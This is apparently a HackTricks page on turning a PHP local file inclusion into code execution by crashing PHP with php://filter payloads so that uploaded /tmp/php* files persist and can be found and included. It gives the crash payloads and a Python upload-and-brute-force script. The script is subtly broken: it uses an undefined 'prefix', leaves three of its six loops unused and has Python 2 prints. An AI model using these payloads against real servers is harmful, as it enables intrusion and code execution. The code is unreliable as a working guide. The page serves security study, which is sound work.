# LFI2RCE via Segmentation Fault

{{#include ../../banners/hacktricks-training.md}}

According to the writeups [https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/) (second part) and [https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view), the following payloads caused a segmentation fault in PHP:

```php
// PHP 7.0
include("php://filter/string.strip_tags/resource=/etc/passwd");

// PHP 7.2
include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
```

You should know that if you **send** a **POST** request **containing** a **file**, PHP will create a **temporary file in `/tmp/php<something>`** with the contents of that file. This file will be **automatically deleted** once the request was processed.

If you find a **LFI** and you manage to **trigger** a segmentation fault in PHP, the **temporary file will never be deleted**. Therefore, you can **search** for it with the **LFI** vulnerability until you find it and execute arbitrary code.

You can use the docker image [https://hub.docker.com/r/easyengine/php7.0](https://hub.docker.com/r/easyengine/php7.0) for testing.

```python
# upload file with segmentation fault
import requests
url = "http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd"
files = {'file': open('la.php','rb')}
response = requests.post(url, files=files)


# Search for the file (improve this with threads)
import requests
import string
import threading

charset = string.ascii_letters + string.digits

host = "127.0.0.1"
port = 80
base_url = "http://%s:%d" % (host, port)


def bruteforce(charset):
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = prefix + i + j + k
                            url = "%s/index.php?i=/tmp/php%s" % (base_url, filename)
                            print url
                            response = requests.get(url)
                            if 'spyd3r' in response.content:
                                print "[+] Include success!"
                                return True


def main():
    bruteforce(charset)

if __name__ == "__main__":
    main()
```

{{#include ../../banners/hacktricks-training.md}}



